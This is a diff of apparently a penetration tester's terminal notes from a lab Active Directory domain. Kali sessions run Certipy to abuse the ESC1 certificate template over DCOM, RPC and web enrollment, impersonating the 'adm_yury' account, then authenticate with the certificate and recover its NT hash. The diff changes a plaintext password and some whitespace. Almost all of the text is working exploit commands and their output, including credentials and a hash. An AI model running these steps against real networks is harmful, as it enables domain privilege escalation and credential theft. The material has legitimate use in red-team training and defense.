@@ -1,7 +1,7 @@
 DCOM
 
 ──(bang㉿kali)-[~/Desktop]
-└─$ certipy-ad req -u 'test@work.local' -p 'Password123!' -ca work-DC01-CA -target dc01.work.local -template ESC1 -upn 'adm_yury@work.local' -dc-ip 192.168.0.10 -dcom
+└─$ certipy-ad req -u 'test@work.local' -p 'Qpr1al9te!' -ca work-DC01-CA -target dc01.work.local -template ESC1 -upn 'adm_yury@work.local' -dc-ip 192.168.0.10 -dcom
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via DCOM
@@ -13,7 +13,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'adm_yury.pfx'
 File 'adm_yury.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): Y
 [*] Wrote certificate and private key to 'adm_yury.pfx'
-                                                                                                                                                                                                                                           
+                                                                                                                                                                                                           
 ┌──(bang㉿kali)-[~/Desktop]
 └─$ certipy-ad auth -pfx adm_yury.pfx -dc-ip 192.168.0.10                                                                                                           
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -32,7 +32,7 @@ File 'adm_yury.ccache' already exists. Overwrite? (y/n - saying no will save wit
 
 SMB3
 ┌──(bang㉿kali)-[~/Desktop]
-└─$ certipy-ad req -u 'test@work.local' -p 'Password123!' -ca work-DC01-CA -target  dc01.work.local -template ESC1 -upn 'adm_yury@work.local' -dc-ip 192.168.0.10  
+└─$ certipy-ad req -u 'test@work.local' -p 'Qpr1al9te!' -ca work-DC01-CA -target  dc01.work.local -template ESC1 -upn 'adm_yury@work.local' -dc-ip 192.168.0.10  
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -59,9 +59,9 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Got hash for 'adm_yury@work.local': aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b
 
 
-WEB
+
 ┌──(bang㉿kali)-[~/Desktop/esc]
-└─$ certipy-ad req -u 'test@work.local' -p 'Password123!' -ca 'work-DC01-CA' -target 'dc01.work.local' -template 'ESC1' -upn 'adm_yury@work.local' -dc-ip '192.168.0.10' -web             
+└─$ certipy-ad req -u 'test@work.local' -p 'Qpr1al9te!' -ca 'work-DC01-CA' -target 'dc01.work.local' -template 'ESC1' -upn 'adm_yury@work.local' -dc-ip '192.168.0.10' -web             
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Checking for Web Enrollment on 'http://192.168.0.10:80'
